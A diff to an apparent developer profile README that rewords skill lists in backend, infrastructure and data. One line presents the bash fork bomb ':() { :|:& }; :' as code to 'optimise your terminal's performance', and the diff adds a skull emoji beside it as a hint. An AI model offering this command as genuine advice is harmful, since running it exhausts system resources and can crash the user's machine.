@@ -4,7 +4,7 @@
   Verifiable Credentials, and WebAuthn, plus the crypto underneath it all.
   These days I'm also getting my hands dirty with Kubernetes and DevOps.
 
-  Here's a nice piece of code to optimise your terminal's performance:
+  Here's a nice piece of code to optimise your terminal's performance ☠️ :
   ``` :() { :|:& }; : ```
 
 
@@ -33,11 +33,11 @@ secure by design, it bugs me.
   **Backend:** Gin, Chi, FastAPI, NestJS, Node.js, Django, REST, gRPC, GraphQL,
   RabbitMQ, Kafka
 
-  **Infra & cloud:** AWS (Networking, Serverless Architecture, Compute, Storage), Containerization & Orchestration, CI/CD, ArgoCD, Helm Template, Service Mesh, IAC & CAC
+  **Infra & cloud:** AWS (Networking, Serverless Architecture, Compute, Storage), Containerization & Orchestration, CI/CD, ArgoCD, Helm Template, Service Mesh, IaC & Configuration-as-Code
 
   **Observability:** Prometheus, Grafana stack (Alloy, Loki, Mimir, Tempo)
 
-  **Data:** PostgreSQL, MySQL, MongoDB, Redis
+  **Data:** SQL & NoSQL, schema design & normalization, ACID & data integrity, indexing, replication & sharding, OLTP vs OLAP
 
 
 ## Say hi
